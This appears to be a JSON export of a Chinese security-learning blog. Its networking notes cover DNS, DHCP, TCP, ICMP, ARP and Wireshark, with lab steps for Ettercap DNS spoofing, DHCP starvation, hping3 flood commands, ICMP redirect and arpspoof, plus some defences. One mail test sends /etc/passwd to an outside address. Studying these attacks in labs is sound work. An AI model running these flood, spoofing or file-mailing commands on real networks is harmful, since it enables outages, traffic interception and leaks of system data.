daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      hellword\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/root:/sbin/nologin\n      ```\n  \n    - c  取代\n  \n      ```\n      [root@192 ~]# sed '1c hellword' test.txt  # 按行替换，替换第一行为helloworld\n      hellword\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/root:/sbin/nologin\n      ```\n  \n    - sed 's/root/xxxx/g'  搜索root 替换为xxx , g 代表全局替换，不加则表示替换找到的第一个\n  \n      ```\n      [root@192 ~]# sed 's/root/xxxxx/g' test.txt \n      xxxxx:x:0:0:xxxxx:/xxxxx:/bin/bash\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/xxxxx:/sbin/nologin\n      ```\n  \n    - -e 多点编辑\n  \n      ```\n      [root@192 ~]# sed -e  's/root/xxxx/g' -e '1c hellword' test.txt\n      hellword\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/xxxx:/sbin/nologin\n      ```\n  \n    \n    - 实战监控CPU\n    \n      ```shell\n      # 查找消耗CPU超过25%的进程并Kill\n      cpu=$(top -n 1 | grep \"%Cpu\" |awk '{print $8}'|awk -F . '{print $1}')\n      if [ $cpu -lt 75 ] ; then\n         pid=$(top -n 1| grep root |head -n 1|awk '{print $2}')\n         echo \"占用CPU资源最多的进程ID是\"$pid\n         filename=$(ls -l /proc/$pid/exe|awk -F '->' '{print $2}')\n         echo “进程路径为”$filename\n         kill -s 9 $pid\n         if [ $? -eq 0 ] ; then\n            echo \"进程已经kill\"\n         fi\n      fi\n      ```\n    \n      \n    \n    - 邮件配置  \n    \n      软件 mailx \n    \n      编辑/etc/mail.rc\n    \n      加入\n    \n      ```\n      set from=zwjscu@qq.com\n      set smtp=smtp.qq.com\n      set smtp-auth-user=zwjscu@qq.com\n      set smtp-auth-password=xxxx(授权码)  去对应的邮箱找\n      set smtp-auth=login\n      \n      运行命令\n      mail -s \"test\" 2194620553@qq.com </etc/passwd\n      \n      # 失败注意安装sendmail\n      yum install sendmail\n      ```\n    \n      ![image-20230417223525208](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230417223525208.png)\n    \n      \n\n​\t\t\t\n\n\n\n​\t\t\t","tags":["系统基础"],"categories":["系统基础"]},{"title":"Windows防火墙","url":"/2023/04/05/系统基础/Windows防火墙_new/","content":"\n\n### windows 防火墙\n\n1、包过滤防火墙\n\n- 判断信息-五元组\n- 工作范围  3-4层\n\n2、应用代理\n\n较大程度地隔绝通信两端的直接通信，所有通信都要由应用层代理层转发,访问者不允许与服务器建立直接的TCP连接，应用层的协议会话过程必须符合代理的安全策略要求。\n\n- 判断信息：应用层数据\n- 工作范围：应用层\n\n3、状态监测防火墙 ASPF\n\n- TCP编辑，IP地址，端口\n- 2-4层\n\n4、WAF \n\n- http协议数据（request response）\n- 应用层\n\n5、多合一网关\n\n- FW IDS IPS AV\n- 2-7\n\n6、下一代防火墙（NGFW）\n\n- FW IDS IPS AV WAF\n\n7 、windows 防火墙\n\nnetsh advfirewall /?\n\n![image-20230405153535345](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230405153535345.png)\n\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"邮件协议","url":"/2023/03/31/系统基础/邮件协议_new/","content":"\n\n### 邮件协议\n\n1、邮件协议\n\n- SMTP：简单邮件传输协议，TCP端口号25，主要用于发送电子邮件\n\n  SMTP代表Simple Mail Transfer Protocol。SMTP用于发送电子邮件并将其路由到正确的目标服务器（或邮箱）。SMTP服务器提供从邮件客户端（例如Microsoft Outlook、Gmail等）发送电子邮件所需的服务。当你发送一封电子邮件时，SMTP服务器接收该邮件，检查发送者是否有权访问该邮件，并将其传递到邮件接收服务器。SMTP是向外发送电子邮件的标准协议。\n\n  \n\n- POP3：邮局协议第三版，默认TCP端口号110号，主要用于接收电子邮件\n\n  POP3是用于从邮件服务器上检索电子邮件的一种协议。使用POP3协议时，用户在邮件客户端上对本地邮件的操作（如，删除、转移至其它文件夹等）不会影响服务器上的邮件。但如果用户未勾选“在服务器上保留邮件的副本”时，不同的邮件客户端看到的本地邮件将会有所不同。\n\n  \n\n- IMAP4：网际消息访问协议第四版，默认端口号143号，主要用于在线查看邮件（接收邮件)\n\n  使用IMAP协议时，用户在某个邮件客户端上的操作，将会被“映射”到邮件服务器上。因此，使用IMAP协议，可以同时保持多个邮件客户端上邮件的同步。\n\n  \n\n2、常见电子邮件系统\n\n- exchange\n- postfix\n- 第三方（qq,163）\n\n3、邮件客户端\n\n- foxmail\n- outlook\n- 网易邮箱大师\n- QQ邮箱\n\n4、wireshark 抓包\n\n可以尝试抓到明文用户名，密码，内容\n\npop3  : 从邮件服务器拉取邮件，删除后不影响邮件服务器\n\n![image-20230404211806927](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230404211806927.png)\n\nIMAP：删了就是删了\n\n![image-20230404211855826](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230404211855826.png)","tags":["系统基础"],"categories":["系统基础"]},{"title":"HTTP","url":"/2023/03/29/系统基础/HTTP_new/","content":"\n​            \n\n\n### HTTP协议-HTTPS\n\n#### 1、HTTP\n\n- 超文本传输协议，默认端口80，基于TCP\n- http是无连接的，限制每次连接只处理一个请求\n- http是无状态的，没有记忆能力\n\n#### 2、HTTPS\n\n- https = http + ssl/tls\n\n- 在http的通道上增加了安全性，传输过程中通过加密和身份验证来确保传输安全性。\n\n- tls\n\n  传输层安全协议，SSL和tls其实是一个协议，SSL 2.0版本自SSL3.0版本以后更名为TLS1.0，目前最高TLS1.3，最广泛应用的是TLS1.2。\n\n- 传输之前，client和server 协商数据传输过程中的加密算法，包含非对称加密的密钥交换算法（RSA），数据签名摘要算法（MD5，sha），对称加密算法（DES/AES ）\n- 客户端生成随机的字符串，通过协商好的非对称加密算法，使用服务端的公钥对该字符串进行加密，发送给服务端。服务端收到后，使用自己的私钥进行解密得到该字符串，随后的数据传输中，使用这个字符串作为密钥进行对称加密。\n\n![image-20230329222217626](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230329222217626.png)\n\n3、PKI\n\n- 数字签名\n\n  ![image-20230329223947617](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230329223947617.png)\n\n4、完整的过程\n\n![image-20230329225150730](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230329225150730.png)","tags":["系统基础"],"categories":["系统基础"]},{"title":"FTP","url":"/2023/03/28/系统基础/FTP_new/","content":"\n\n### FTP协议\n\n1、概念\n\n- 文件传输协议，CS架构，基于TCP，默认端口号20，21\n\n-   主动模式\n\n  ![image-20230328231152827](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230328231152827.png)\n\n- 被动模式\n\n  ![image-20230328231118733](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230328231118733.png)\n\n2、软件\n\n- 服务器软件\n  - serv-U\n  - filezilla server\n  - vsftpd\n  - IIS\n\n- 客户端\n  - ftp serverIP\n  - 资源管理器  ftp://192.168.10.10\n  - 浏览器  ftp://server_ip\n  - 第三方工具\n\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"DNS","url":"/2023/03/26/系统基础/DNS_new/","content":"\n\n###  DNS 协议\n\n1、概念\n\n- DNS记录\n  - A   : 主机记录，域名和IP的映射\n  - CNAME ： 别名\n  - SOA：权威名称服务器\n  - NS：名称服务器\n  - MX：邮件交换记录\n  - SRV： 正在提供服务的\n  - PTR:  反向指针\n\n2、DNS查询\n\n- 客户机访问www.baidu.com，根据自己的TCP/IP参数，向自己的首选DNS服务器发送DNS请求\n\n- 首选DNS服务器收到客户机的请求后，去查询自己的区域文件，找不到IP地址信息（将请求转发给根域服务器）；直接可以找到，则返回IP地址\n- 根域服务器收到请求后，由于根域服务器只维护顶级域服务器，会响应顶级域名服务器IP（com）,首选DNS根据根域名服务器响应的信息，将请求转发到com顶级域\n- com顶级域收到请求，由于com顶级域只维护二级域信息，会响应二级域服务器IP，首选DNS根据顶级域响应的信息，将请求转发到baidu.com 二级域\n- baidu.com 二级域收到请求，baidu.com DNS服务器里面维护的是baidu.com 区域内的所有主机信息，包含了www.baidu.com的信息，将IP地址响应给首选DNS\n- 首选DNS响应给主机。   \n\n![image-20230327213240915](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327213240915.png)\n\n3、 DNS配置 缓存DNS服务器 \n\n- server2016上安装DNS服务，配置转发器\n\n  ![image-20230327223920382](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327223920382.png)\n\n- 将另一台主机DNS服务器设置为server2016的IP，随后nslookup 查询特定域名\n\n- wireshark抓包\n\n  ![image-20230327224042516](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327224042516.png)\n\n- server2016这个缓存DNS服务器向转发器中的DNS服务器（192.168.10.1）转发DNS请求，192.168.10.1请求到以后，返回给server2016，server2016再响应client。\n\n  \n\n4、 DNS攻击\n\n环境：\n\nkali   192.168.101.8  攻击机器\n\nserver2016  web服务器  192.168.101.6 提供web界面\n\nwin10  192.168.101.11  被攻击的主机\n\n工具  Ettercap\n\n\n\n- 修改/etc/ettercap/etter.dns  格式 要欺骗的域名 A + 目标IP\n\n   ![image-20230327231322145](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231322145.png)\n\n- 配置Ettercap，打开后扫描主机进行arp欺骗\n\n  选择目标主机以及网关add to Target，随后点击ARP poisoning , 随后选择dns_spoof 进行欺骗。\n\n  ![image-20230327231418945](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231418945.png)\n\n![image-20230327231509695](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231509695.png)\n\n![image-20230327231539501](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231539501.png)\n\n![image-20230327231033145](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231033145.png)\n\n最后在目标主机访问woniu.com 被修改成了192.168.101.6 的web页面。","tags":["系统基础"],"categories":["系统基础"]},{"title":"DHCP","url":"/2023/03/23/系统基础/DHCP_new/","content":"\n\n### DHCP协议\n\n1、DHCP的工作原理\n\n- 动态主机配置协议，主要给客户机提供TCP/IP参数（IP地址、子网掩码、网关、DNS）\n- 好处\n  - 减少管理员的工作量\n  - 减少出错的可能，避免输入错误\n  - 避免IIP冲突\n  - 提高IP地址利用  \n\n- 应用层协议，基于UDP，端口号67，服务器响应给客户机的68号端口，客户机与服务器的交互过程\n\n  - dhcp discover  客户机 发送 ，以广播方式，网络中所有的DHCP服务器都会受到并响应 ，客户向受到的第一个offer报文的服务器发送request请求\n  - dhcp offer dhcp 服务器发送的提供报文\n  - dhcp request client 发送的request请求\n  - dhcp ack  服务器确认，客户机获得IP参数 \n\n  ![image-20230323204319729](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323204319729.png)\n\n  除了以上的还有四种报文\n\n  - dhcp release\n  - dhcp nak: 针对request 的拒绝报文\n  - dhcp decline：当客户端发现接收到IP冲突时，发送此报文给服务器\n  - dhcp inform：已经有IP地址，获取其他的配置信息，如网关，DNS等 \n\n2、windows server 部署\n\n如图的拓扑结构，R1上需要在f0/0接口配置dhcp中继，VM1才能请求到DHCPserver 分配的IP地址。 \n\n如图 DHCP server 配置了两个dhcp 作用域，50和120网段\n\n![image-20230323214149891](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323214149891.png)\n\n\n\n3、抓流量 \n\n- 示例1，释放vmnet1 的地址来抓包，查看这个过程\n\n```\nipconfig /release  \"VMware Network Adapter VMnet1\"\nipconfig /renew  \"VMware Network Adapter VMnet1\"\n```\n\n![image-20230323205013933](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323205013933.png)\n\n\n\nclient获取IP地址是一直在发广播报文： \n\n![image-20230323205412576](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323205412576.png)\n\n\n\ndhcp server 则是发的单播报文\n\n![image-20230323205457859](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323205457859.png)\n\n4、 DHCP欺骗\n\n攻击DHCP，发送discover 报文使得DHCP服务器的IP被耗尽，从而无法提供服务。\n\n使用的工具是 yersinia, 可以攻击DHCP服务器使得IP被耗尽，随后伪造一个DHCP服务器。\n\n攻击的拓扑结构\n\n![image-20230324215603531](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230324215603531.png)\n\n5、DHCP防御\n\n- 在交换机上配置信任端口\n\n  - 开启DHCP监听\n\n    ```powershell\n    ip dhcp snooping\n    ```\n\n  - 指定监听vlan\n\n    ```powershell\n    ip dhcp snooping vlan1\n    ```\n\n  - 由于开启监听后，交换机上的所有端口都变成非信任端口，会拒绝所有DHCP报文，需要将正常的接口配置为信任端口\n\n    ```powershell\n    int f0/1\n    ip dhcp snooping trust\n    ```\n\n  ","tags":["系统基础"],"categories":["系统基础"]},{"title":"UDP","url":"/2023/03/23/系统基础/UDP_new/","content":"\n\n### UDP协议\n\n- 特点\n\n  不需要连接，直接发送数据，不会重新排序，也不需要确认\n\n- 报文字段\n  - 源端口\n  - 目的端口\n  - length\n  - checksum\n  - stream index \n  - timestamps\n  - udp payload\n\n- 常见UDP\n  - DNS 53\n  - ntp  123\n  - tftp 69\n  - rpc 111\n  - snmp 161\n\n- udp 攻击\n\n  ```powershell\n  hping3 -q -n --rand-source --udp -p 53 --flood 192.168.198.135 -d 10000\n  ```\n\n  ![image-20230323202403665](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323202403665.png)","tags":["系统基础"],"categories":["系统基础"]},{"title":"tcp","url":"/2023/03/23/系统基础/tcp_new/","content":"\n\n### TCP协议\n\n- tcp字段\n\n![image-20230323160711404](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323160711404.png)\n\n- 三次握手\n\n  ![image-20230323161445330](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323161445330.png)\n\n  wireshark 抓包情况如下，第一次SYN=1 seq=391720034, 第二次SYN=1 ACK=1 seq = 3010721076 ack= 391720035, 第三次 ACK=1, seq=391720035 ack = 3010721077, 第二次的seq是一个随机数，ack=第一次seq+1, 第三次的seq=第二次的ack，ack= 第二次的seq+1\n\n  ![image-20230323171451595](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171451595.png)\n\n  ![image-20230323171545209](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171545209.png)\n\n  ![image-20230323171639573](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171639573.png)\n\n  ![image-20230323171707687](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171707687.png)\n\n- 四次挥手\n\n  \n\n![image-20230323163146327](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323163146327.png)\n\n- tcp 半关闭状态\n\n- tcp半连接状态\n\n  客户端syn，服务器syn, ack ,客户端不继续ack\n\n  - syn flood Ddos\n\n    ```powershell\n    hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.198.135\n    ```\n\n    ![image-20230323194158066](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323194158066.png)\n\n  \n\n- ddos 防御\n\n  - tcp代理\n\n  - tcp源探测\n\n    回复伪造的syn+ack，然后如果client 发送RST，则说明是正常的包放行\n\n    ![image-20230323200541055](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323200541055.png)\n\n  - TCP连接数量限制","tags":["系统基础"],"categories":["系统基础"]},{"title":"ICMP协议","url":"/2023/03/20/系统基础/ICMP协议_new/","content":"\n\n### ICMP协议\n\n1、理解ICMP协议\n\n- Internet 控制报文协议，用于在IP主机、路由器之间传输控制信息，控制消息指的是网络通不通，主机是否可达，路由是否可用等。\n\n- ICMP基本概念\n\n  - 网络层协议，封装在网络层和传输层之间\n\n    ![image-20230321232207781](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230321232207781.png)\n    \n    ![image-20230321231850530](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230321231850530.png)\n\n2、理解ICMP重定向\n\n在某些特定情况下，路由器检测到主机使用非优化路由时候，会向主机发送一个ICMP重定向的报文，使得主机的路由改变。\n\n- 重定向攻击\n\n  - kali上使用工具实施ICMP重定向网关\n\n    ```powershell\n    netwox 86 -g 192.168.198.128  # 把网络中的网关修改为192.168.198.128\n    ```\n\n    \n\n3、会使用wireshark分析ICMP重定向\n\n实验条件\n\nkaili 地址 192.168.198.128\n\nwin10地址 192.168.198.134\n\n ![image-20230323154737753](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323154737753.png)\n\n![image-20230323154939442](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323154939442.png)\n\n在kali上运行工具netwox ，伪装的网关是 192.168.198.128，随后在win10上ping www.baidu.com，接着wireshark可以看到如下结果：修改了网关地址为 192.168.198.128，但是网关随便修改成功，但是攻击失败，目标仍然可以上网，原因未知。\n\n![image-20230323155135888](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323155135888.png)\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"arp协议","url":"/2023/03/20/系统基础/arp协议_new/","content":"\n\n### ARP协议\n\n#### 一、ARP协议\n\n将一个已知的IP地址解析为MAC地址，从而进行二层数据交互，是一个三层的协议，但是工作在二层，是一个2.5层协议。\n\n#### 二、工作流程\n\n1、两个阶段\n\n- ARP请求\n- ARP响应\n\n![image-20230320215353648](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320215353648.png)\n\n2、arp数据格式\n\n目的MAC地址：源MAC地址：帧的类型：ARP请求（硬件类型：协议类型：硬件地址长度：协议地址长度: Opcode：发送方MAC地址：发送方IP地址：目标MAC地址：目标IP地址   ）  \n\n![image-20230320220140891](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320220140891.png)\n\n\n\n![image-20230320220115823](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320220115823.png)\n\n3、arp 缓存\n\n- 目的是为了防止重复请求\n\n- 命令\n\n```\nARP -a  #查看所有IP地址和MAC地址对应 \narp -s IP MAC # 静态绑定\narp -d # 清除arp\n```\n\n4、ARP攻击以及欺骗\n\n- ARP 攻击\n\n  - 禁用网络服务   如下图所示，主机A无法通信 \n\n    - 伪造ARP应答报文，向被攻击主机响应虚假的MAC地址\n    - 当被攻击主机进行网络通信时，会将数据交给虚假的mac 地址进行转发，由于虚假的MAC地址不存在，造成被攻击主机无法访问网络\n\n    ![image-20230320221210037](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320221210037.png)\n\n- ARP欺骗\n  - 欺骗网关\n  \n    - 伪造arp应答报文，向被攻击主机和网关响应真实的MAC地址\n    - 当被攻击主机进行网络通信时，会将数据交给真实MAC地址（C）进行转发给网关，从而来截获被攻击主机的数据，被攻击主机可以进行网络通信\n  \n    ![image-20230320221606799](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320221606799.png)\n  \n  - 欺骗主机\n  \n    - 伪造arp应答报文，向被攻击主机和通信响应真实的MAC地址\n  \n    - 当被攻击主机进行网络通信时，会将数据交给真实MAC地址（C），从而来截获被攻击主机的数据，被攻击主机可以进行网络通信\n  \n      ![image-20230320222126646](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320222126646.png)\n\n​\t\t\n\n- ARP-防御\n  - arp绑定\n\n- arp-实验\n\n  - 工具  arpspoof \n\n    ```powershell\n    apt-get install dsniff\n    ```\n\n  - 命令   \n\n    ```\n    sudo arpspoof -i eth0 -t 192.168.101.11 192.168.101.1\n    ```\n\n    向目标主机192.168.101.11 发送arp欺骗报文，使得192.168.101.1（网关），192.168.101.5（kali）的MAC地址都是攻击者的MAC地址，但是未开启转发，所以无法访问网络。\n\n    ![image-20230320225431939](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320225431939.png)\n\n![image-20230320225544395](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320225544395.png)\n\n![image-20230320225639735](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320225639735.png)\n\n- 开启转发\n\n  ```powershell\n  echo 1> /proc/sys/net/ipv4/ip_forward \n  ```\n\n  开启以后，网络恢复畅通，实现了arp 欺骗攻击。","tags":["系统基础"],"categories":["系统基础"]},{"title":"WireShark","url":"/2023/03/16/黑客工具/WireShark_new/","content":"\n\n协议\n\nTCP/IP 协议族\n\n- 网络接口层   PPPOE\n  - 物理层\n  - 数据链路层\n- 网络层：IP　ARP　RARP ICMP IGMP \n- 传输层  TCP(传输控制协议) UDP（用户数据包协议）\n- 应用层  HTTP FTP  DNS DHCP HTTPS SMTP  POP IMAP   0-65535   0-1023\n\n### WireShark  流量抓取工具\n\n一、网卡\n\n对主机网卡上的数据流量进行抓取\n\n1、网卡模式\n\n- 混杂模式  设置为混杂模式才可以抓取 \n- 非混杂模式（默认），不会接收目的非自己的数据\n\n2、界面认识\n\n3、过滤器\n\n- 捕获过滤器：抓包之前过滤，只抓某些类型如TCP\n\n  ![image-20230316224227676](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230316224227676.png)\n\n- 显示过滤器：抓取所有类型，查看时只显示特定类型\n\n![image-20230316224410232](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230316224410232.png)\n\n\n\n4 过滤器的语法\n\n- 捕获过滤器\n\n  - 类型：host net port \n\n  - 方向:src dst \n\n  - 协议: ether ip tcp udp http ftp dns\n\n  - 运算符: &&  ||  !  \n\n    示例 抓取源IP 为192.168.18.14 并且目标端口为80 的报文\n\n    ```powershell\n     src host  192.168.18.14 && dst port 80\n    ```\n\n    抓取IP 为192.168.18.1 或者192.168.18.14 的报文\n\n    ```powershell\n    host 192.168.18.14 || host 192.168.18.1\n    ```\n\n    非广播\n\n    ```powershell\n    ！broadcast\n    ```\n\n    抓取源IP 192.168.18.14 或者源IP 192.168.18.0 目的TCP端口 200-1000，位于129.0.0.0/8\n\n    ```powershell\n    (src ip  192.168.18.14 ||src net  192.168.18.0/24) && (dst portrange 200-1000 && dst net 129.0.0.0/8)\n    ```\n\n     \n\n- 显示过滤器\n  - 语法\n    - 比较的操作符： == (eq) != (neq) > (gt) < (lt) >= (ge)  <=(le)\n    - 逻辑操作符：  and &&  or || not \n    - IP 地址  ip.addr ip.src ip.dst\n    - 端口过滤  tcp.port udp.port tcp.dstport tcp.flag.syn \n    - 协议过滤： arp ip  icmp tcp udp\n  \n  - 示例：\n  \n    - 显示源IP是 192.168.18.14 并且tcp 端口是443\n  \n      ```powershell\n      ip.src==192.168.18.14&& tcp.port==443\n      ```\n  \n    - 显示源 不为192.168.18.14 或者目的不为202.98.96.68\n  \n      ```powershell\n      ip.src!=192.168.18.14 || ip.dst!=202.98.96.68\n      ```\n\n- 案例\n\n  查找www.jd.com 的dns解析以及http 通信报文\n\n![image-20230317223959377](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230317223959377.png)\n\n![image-20230317224016895](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230317224016895.png)\n\n![image-20230317224106101](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230317224106101.png)\n\n","tags":["黑客工具"],"categories":["黑客工具"]},{"title":"NAT","url":"/2023/03/15/系统基础/NAT_new/","content":"\n\n一、NAT基本概念\n\n 将私网IP地址转换为公网IP地址 \n\n1、转换方式\n\n- 静态转换  仅针对IP地址转换 1对1\n\n  ```powershell\n  ip nat inside source static 192.168.1.1 64.23.12.34\t\n  ```\n\n  \n\n- 动态转换 仅针对IP地址转换 多对多(当内网主机多以外网IP个数时，无法实现内网所有主机上网 )，也无法根据外网地址定位内网，所以只能内网访问外网\n  ```powershell\n  #定义内网范围\n  access-list 1 permit 192.168.10.0 0.0.0.255\n  \n  #定义外网范围\n  ip nat pool woniu 23.24.56.60 23.24.56.61 netmask 255.255.255.0\n  #应用\n  ip nat inside source list 1 pool woniu\n  ```\n\n  \n\n- 端口多路复用PAT 多对1转，携带端口一起转换  192.168.1.1：8899 ---》1.2.3.4：12345，形成的也是动态对应关系，只能内网访问外网\n\n  - 端口多路复用\n\n    - 内网的多个地址转换为外网的一个IP地址（端口一起转换）\n\n      ```powershell\n      #定义内网范围\n      access-list 1 permit any\n      \n      #定义外网范围\n      ip nat pool woniu 23.24.56.60 23.24.56.60 netmask 255.255.255.0\n      #应用\n      ip nat inside source list 1 pool woniu overload\n      ```\n\n      \n\n    - 内网多个地址直接转换为外网接口的地址\n\n      ```powershell\n      #定义内网范围\n      access-list 1 permit any\n      \n      #应用\n      ip nat inside source list 1 int g0/1 overload\n      ```\n\n      \n\n- 端口映射(服务器映射)  -  只能外网访问内网\n\n  - 将一台内网的服务器发布到内网，从而使内网的主机可以访问到内网的服务器\n\n  - 192.168.1.1：80 -》54.234.123.55：80\n\n    ```powershell\n    ip nat inside source static tcp 192,168.1.100 80 23.34.56.78 8888\n    ```\n\n    \n\n​\t\t\t\t","tags":["系统基础"],"categories":["系统基础"]},{"title":"动态路由协议","url":"/2023/03/11/系统基础/动态路由协议_new/","content":"\n\n## 动态路由协议\n\n- 动态路由协议\n\n  - RIP：路由信息协议，距离矢量路由协议\n\n  - OSPF：开放式最短路径优先\n\n  - BGP：外部网关路由协议\n\n- 特点\n\n  - 减少管理员的工作量\n\n  - 增加了网络带宽\n\n- 什么是内部，什么是外部\n  - AS：运行相同的路由协议的路由器属于同一个自治系统\n  - 通过自治系统连接外部的路由器，需要经过外部网关\n  - 内部网关路由协议（IGP）：用于在单一自治系统中去决策路由，RIP，OSPF\n  - 外部网关路由协议：用于连接不同自治系统，BGP\n\n![image-20230311225105486](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230311225105486.png)\n\n- 动态路由协议需要考虑的内容\n  - 度量值：跳数、带宽、时延、成本\n  - 收敛：所有路由器的路由表达到一致的状态\n\n- RIP协议\n\n  - 基本概念\n\n    - 一种内部网关协议，在单一自治系统内的路由器去传递路由信息\n    - 靠跳数来衡量到达目标的距离\n      - 最大15跳，16代表不可达\n\n    - 每隔30秒向相邻的路由器发送路由更新消息，采用UDP 520端口\n    - 从相邻的路由器去学习路由条目\n\n![image-20230311230625611](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230311230625611.png)\n\n不同颜色代表不同周期，C代表直连，R代表路由器，第二列代表网段，第三列代表端口号，第四列代表距离\n\n\n\n- OSPF 动态路由协议\n\n  - 概念\n\n    - 开放式最短路径优先路由协议，内部网关路由协议\n\n    - 链路状态路由协议：在单一区域内的路由器可以向相邻路由器发送链路状态信息\n\n    - 工作过程\n\n      - 相邻的路由器建立邻接关系\n\n      - 根据链路信息，建立链路状态数据库\n      - 最短路径树计算\n      - 路由表\n\n  - OSPF区域\n\n    - 划分区域\n      - 适应大型网络\n      - 每个ospf 路由器只维护自己所在区域的链路状态信息\n      - 每个区域有一个区域ID，用十进制或者IP地址表示\n      - 骨干区域：区域之间的路由信息传播\n        - 区域ID：0，0.0.0.0\n      - 非骨干区域：普通区域\n\n    - 单区域内容\n\n      - 在同一个区域当中通过选举DR和BDR来节省网络中的流量\n\n        区域中的其他路由器只会和DR和BDR建立邻接关系  \n\n      - DR 选举\n        - 通过routeID进行选举，最大的作为DR，第二大作为 BDR\n    \n    - 度量值\n      - cost值（代价）\n    \n    - 邻接关系建立\n    \n      - 以组播方式发送\n        - 224.0.0.5 代表所有OSPF\n        - 224.0.0.6 代表DR BDR\n    \n      - 报文类型\n        - hello保温\n        - 数据库描述包\n        - 链路状态请求包\n        - 链路状态更新包\n        - 链路状态确认包\n\n- RIP 和OSPF对比\n\n  - RIP１　